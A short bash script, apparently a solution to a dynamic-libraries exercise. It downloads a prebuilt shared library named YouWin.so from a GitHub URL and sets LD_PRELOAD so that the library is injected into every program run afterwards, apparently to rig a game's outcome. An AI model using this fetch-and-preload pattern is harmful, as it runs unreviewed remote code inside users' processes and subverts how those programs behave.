#!/bin/bash
wget -P .. https://raw.githubusercontent.com/monoprosito/Karim-Aboualenin/alx-low_level_programming/blob/master/0x18-dynamic_libraries/YouWin.so
export LD_PRELOAD="$PWD/../YouWin.so"
